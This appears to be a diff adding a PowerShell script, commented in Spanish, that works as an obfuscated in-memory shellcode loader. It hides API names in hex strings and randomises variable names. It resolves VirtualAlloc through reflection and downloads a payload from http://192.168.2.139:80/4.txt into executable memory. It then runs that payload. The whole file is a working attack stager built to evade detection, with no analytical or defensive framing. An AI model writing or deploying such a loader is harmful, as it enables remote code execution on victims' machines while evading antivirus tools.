@@ -1,0 +1,93 @@
+Set-StrictMode -Version 2
+
+# Función para generar nombres aleatorios para variables y métodos
+function Generate-RandomString {
+    param([int]$length = 10)
+    -join ((65..90) + (97..122) | Get-Random -Count $length | % {[char]$_})
+}
+
+# Función para convertir valores hexadecimales a texto
+function Convert-HexToString {
+    param([string]$hex)
+    $bytes = @()
+    for ($i = 0; $i -lt $hex.Length; $i += 2) {
+        $bytes += [Convert]::ToByte($hex.Substring($i, 2), 16)
+    }
+    return [System.Text.Encoding]::UTF8.GetString($bytes)
+}
+
+# Crear métodos dinámicos
+$methodGenerateDelegate = Generate-RandomString
+$methodResolveFunction = Generate-RandomString
+
+# Definir funciones dinámicamente
+Set-Variable -Name $methodGenerateDelegate -Value {
+    param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $paramTypes,
+        [Parameter(Position = 1)] [Type] $returnType = [Void]
+    )
+    $assemblyName = Convert-HexToString "5265666C656374656444656C6567617465" # "ReflectedDelegate"
+    $moduleName = Convert-HexToString "496E4D656D6F72794D6F64756C65"       # "InMemoryModule"
+    $typeName = Convert-HexToString "4D7944656C656761746554797065"         # "MyDelegateType"
+    $methodName = Convert-HexToString "496E766F6B65"                       # "Invoke"
+
+    $typeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object System.Reflection.AssemblyName($assemblyName)),
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+    ).DefineDynamicModule($moduleName, $false).DefineType(
+        $typeName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]
+    )
+    $typeBuilder.DefineConstructor(
+        'RTSpecialName, HideBySig, Public',
+        [System.Reflection.CallingConventions]::Standard,
+        $paramTypes
+    ).SetImplementationFlags('Runtime, Managed')
+    $typeBuilder.DefineMethod(
+        $methodName,
+        'Public, HideBySig, NewSlot, Virtual',
+        $returnType,
+        $paramTypes
+    ).SetImplementationFlags('Runtime, Managed')
+    return $typeBuilder.CreateType()
+}
+
+Set-Variable -Name $methodResolveFunction -Value {
+    param ($libraryName, $functionName)
+    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
+    $targetAssembly = $assemblies | Where-Object {
+        $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq (Convert-HexToString "53797374656D2E646C6C") # "System.dll"
+    }
+    $nativeMethodsType = $targetAssembly.GetType(
+        (Convert-HexToString "4D6963726F736F66742E57696E33322E556E736166654E61746976654D6574686F6473") # "Microsoft.Win32.UnsafeNativeMethods"
+    )
+    $getProcAddressMethod = $nativeMethodsType.GetMethod(
+        (Convert-HexToString "47657450726F6341646472657373"), # "GetProcAddress"
+        [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string')
+    )
+    $moduleHandle = $nativeMethodsType.GetMethod(
+        (Convert-HexToString "4765744D6F64756C6548616E646C65") # "GetModuleHandle"
+    ).Invoke($null, @($libraryName))
+    $handleRef = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $moduleHandle)
+    return $getProcAddressMethod.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$handleRef, $functionName))
+}
+
+# Lógica principal
+If ([IntPtr]::size -eq 8) {
+    $urlEncoded = "687474703A2F2F3139322E3136382E322E3133393A38302F342E747874" # "http://192.168.2.139:80/4.txt"
+    [Byte[]]$payloadData = (New-Object Net.WebClient).DownloadData((Convert-HexToString $urlEncoded))
+
+    $libraryName = Convert-HexToString "6B65726E656C33322E646C6C" # "kernel32.dll"
+    $allocFunction = Convert-HexToString "5669727475616C416C6C6F63" # "VirtualAlloc"
+
+    $memoryAllocator = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+        (&(Get-Variable -Name $methodResolveFunction).Value $libraryName $allocFunction),
+        (&(Get-Variable -Name $methodGenerateDelegate).Value @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
+    )
+    $memoryBuffer = $memoryAllocator.Invoke([IntPtr]::Zero, $payloadData.Length, 0x3000, 0x40)
+    [System.Runtime.InteropServices.Marshal]::Copy($payloadData, 0, $memoryBuffer, $payloadData.Length)
+    $executePayload = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+        $memoryBuffer,
+        (&(Get-Variable -Name $methodGenerateDelegate).Value @([IntPtr]) ([Void]))
+    )
+    $executePayload.Invoke([IntPtr]::Zero)
+}
